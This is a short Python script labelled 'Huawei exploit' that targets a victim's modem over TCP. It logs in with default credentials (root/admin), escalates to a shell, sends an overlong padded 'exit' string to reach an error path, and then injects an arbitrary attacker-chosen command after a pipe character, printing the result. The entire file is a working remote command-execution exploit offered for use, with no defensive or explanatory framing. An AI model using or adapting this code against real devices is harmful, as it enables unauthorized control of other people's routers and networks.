import argparse
import socket
import time


def check_partern(sock, p):
    curtime = time.time()
    while (time.time() - curtime) <= 5:
        data = sock.recv(1024)
        if p in data:
            return True
    return False


parser = argparse.ArgumentParser(description='Huawei exploit')
parser.add_argument('-i','--ip', help='IP of victim\'s modem',required=True, dest='victim_ip')
parser.add_argument('-p','--port',help='Port of victim\'s modem', required=True, dest='victim_port')
parser.add_argument('-c','--command',help='command to execute', required=True, dest='command')

args = parser.parse_args()

g_victim_ip = args.victim_ip
g_victim_port = int(args.victim_port)
g_command = args.command
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((g_victim_ip, g_victim_port))
s.sendall(b'\nroot\n')
check_partern(s,"assword")
s.sendall(b'admin\n')
check_partern(s,"WAP")
s.sendall(b"su\n")
check_partern(s,"WAP")
s.sendall(b'shell\n')
check_partern(s,"WAP")
s.sendall(b'exittttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt\r\n')
_ = s.recv(1024)
# print(data)
time.sleep(0.1)
s.sendall(b'|' + g_command + ' \r\n\r\n')
time.sleep(0.5)
data = s.recv(1024)
p = data.find("File name too long\r\n")
data = data[p + 20:]
p = data.find("WAP")
data = data[:p]
# print('Received: \n', data)
print(data)
